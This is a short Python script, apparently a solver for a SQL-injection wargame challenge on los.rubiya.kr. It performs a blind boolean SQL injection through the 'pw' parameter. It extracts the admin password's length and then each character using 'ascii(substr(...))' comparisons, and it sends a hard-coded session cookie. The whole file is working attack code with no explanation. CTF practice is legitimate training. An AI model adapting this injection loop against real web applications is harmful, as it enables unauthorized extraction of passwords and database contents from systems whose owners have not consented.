import sys
import urllib
import requests


def get_ascii(param):
    param = urllib.parse.quote(f"' || id='admin' && {param}")
    url = f"https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
    idx = 0
    while(True):
        idx += 1
        data = f"{url}{param}={idx}%23"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
                , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'}
        cookie = {'PHPSESSID' : 'l9g226ba80aorqek0gqubmcqn2'}
        res = requests.get(data, headers=headers, cookies = cookie)
        
        
        if '<hr><br><h2>Hello admin</h2>' in res.text:
            return idx
        
    


def get_length(query):
    return get_ascii("length(%s)" % query)

def get_content(query):
    content_len = get_length(query)
    content = ''
    # print(content_len)
    if content_len == 0:
        print('Invalid input')
        return ''
    if content_len == "error":
        print("Error")
        return "error"
    for idx in range(1, content_len + 1):
        content += chr(get_ascii('ascii(substr(%s,%d,1))' % (query, idx)))
        sys.stdout.write('\r[' + str(content_len) + '] ' + content + '_' * (content_len - len(content)))

    sys.stdout.write('\n')

    return content



content = get_content('pw')
